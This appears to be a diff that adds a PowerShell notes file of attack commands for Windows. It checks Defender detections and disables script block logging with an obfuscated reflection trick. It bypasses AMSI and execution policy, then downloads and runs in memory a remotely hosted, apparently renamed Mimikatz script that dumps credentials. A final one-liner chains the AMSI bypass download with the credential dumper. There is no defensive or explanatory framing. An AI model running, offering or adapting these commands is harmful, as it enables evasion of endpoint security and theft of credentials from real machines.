@@ -1,0 +1,16 @@
+Get-MpThreatDetection | Sort InitialDetectionTime -Descending | select -First 1
+Get-MpThreat
+
+[ScriptBlock]."Get`Fiel`d"('signatures','N'+'onPublic,Static').SetValue($NULL,(New-Object Collections.Generic.HashSet[string]));$e=new-object net.webclient;$e.proxy=[Net.WebRequest]::GetSystemWebProxy();$e.Proxy.Credentials=[Net.CredentialCache]::DefaultCredentials;IEX $e.downloadstring('https://raw.githubusercontent.com/analyticsearch/PowershellMimiKatz/master/Invoke-Adios.ps1');Invoke-Adios -AdiosCreds
+
+Get-MpThreatDetection | Sort InitialDetectionTime -Descending | select -First 2
+Get-MpThreat
+
+Set-ExecutionPolicy -Scope Process -ExecutionPolicy Bypass -force
+. .\AMSIScanBufferBypass.ps1
+[Bypass.AMSI]::Disable()
+
+[ScriptBlock]."Get`Fiel`d"('signatures','N'+'onPublic,Static').SetValue($NULL,(New-Object Collections.Generic.HashSet[string]));$e=new-object net.webclient;$e.proxy=[Net.WebRequest]::GetSystemWebProxy();$e.Proxy.Credentials=[Net.CredentialCache]::DefaultCredentials;IEX $e.downloadstring('https://raw.githubusercontent.com/analyticsearch/PowershellMimiKatz/master/Invoke-Adios.ps1');Invoke-Adios -AdiosCreds
+
+One-Liner:
+powershell "IEX (New-Object Net.WebClient).DownloadString('https://raw.githubusercontent.com/analyticsearch/AMSIScanBuffer-Bypass/master/AMSIScanBufferBypass.ps1');if([Bypass.AMSI]::Disable() -eq '0'){IEX (New-Object Net.WebClient).DownloadString('https://raw.githubusercontent.com/analyticsearch/PowershellMimiKatz/master/Invoke-Adios.ps1'); Invoke-Adios -AdiosCreds}"
